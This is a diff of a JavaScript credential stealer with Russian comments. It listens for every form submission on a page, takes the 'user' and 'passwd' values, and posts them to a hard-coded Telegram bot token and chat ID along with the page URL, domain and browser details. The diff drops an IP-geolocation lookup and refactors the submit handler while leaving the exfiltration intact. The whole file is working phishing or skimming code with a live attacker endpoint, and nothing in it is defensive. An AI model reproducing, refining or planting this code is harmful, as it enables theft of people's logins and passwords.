@@ -1,6 +1,7 @@
 const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
 const tgChatId = "-1002252120859";
 
+// Отправка сообщения в Telegram
 function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
     fetch(url, {
@@ -10,33 +11,21 @@ function sendToTelegram(message) {
     }).catch(err => console.error("Ошибка отправки в Telegram:", err));
 }
 
+// Хэширование домена
 function hashDomain(domain) {
     return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
         .then(buffer => {
-            let hashArray = Array.from(new Uint8Array(buffer));
-            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
-            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
+            const hashArray = Array.from(new Uint8Array(buffer));
+            const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
+            return `#${hashHex.slice(0, 8)}`; // Возвращаем первые 8 символов хеша
+        })
+        .catch(err => {
+            console.error("Ошибка хэширования домена:", err);
+            return "#error";
         });
 }
 
-function getIPInfo() {
-    return fetch("https://ipapi.co/json/")
-        .then(response => {
-            if (!response.ok) {
-                throw new Error("Ошибка получения информации о IP");
-            }
-            return response.json();
-        })
-        .then(data => {
-            return {
-                ip: data.ip,
-                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
-                org: window.location.hostname,
-            };
-        })
-        .catch(err => console.error("Ошибка получения информации о IP:", err));
-}
-
+// Упрощенный User-Agent
 function getSimplifiedUserAgent() {
     const userAgent = navigator.userAgent || "Неизвестно";
     const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
@@ -46,16 +35,22 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-document.addEventListener("submit", event => {
+// Обработчик отправки формы
+function handleSubmit(event) {
+    //event.preventDefault(); // Отключаем стандартное поведение формы
+
+    // Получение данных из формы
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
     const password = formData.get("passwd") || "Не указано";
 
+    // Получение данных о User-Agent и домене
     const simplifiedUserAgent = getSimplifiedUserAgent();
+    const domain = window.location.hostname;
 
-    getIPInfo().then(info => {
-        hashDomain(info.org).then(domainHashTag => {
-            const message = `🚀 *Новая отправка формы:*
+    hashDomain(domain).then(domainHashTag => {
+        // Формирование сообщения
+        const message = `🚀 *Новая отправка формы:*
 ---
 - 🛡️ **Логин:**
 \`\`\`
@@ -65,13 +60,18 @@ ${login}
 \`\`\`
 ${password}
 \`\`\`
-- 🌐 **IP-адрес:** ${info.ip}
-- 📍 **Местоположение:** ${info.location}
 - 🖥️ **User-Agent:** ${simplifiedUserAgent}
 - 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${info.org}
+- 🏢 **Организация:** ${domain}
 ${domainHashTag}`;
-            sendToTelegram(message);
-        });
+
+        // Отправка сообщения
+        sendToTelegram(message);
+
+        // Сброс формы после отправки
+        //event.target.reset();
     });
-});
+}
+
+// Добавление обработчика события submit
+document.addEventListener("submit", handleSubmit);
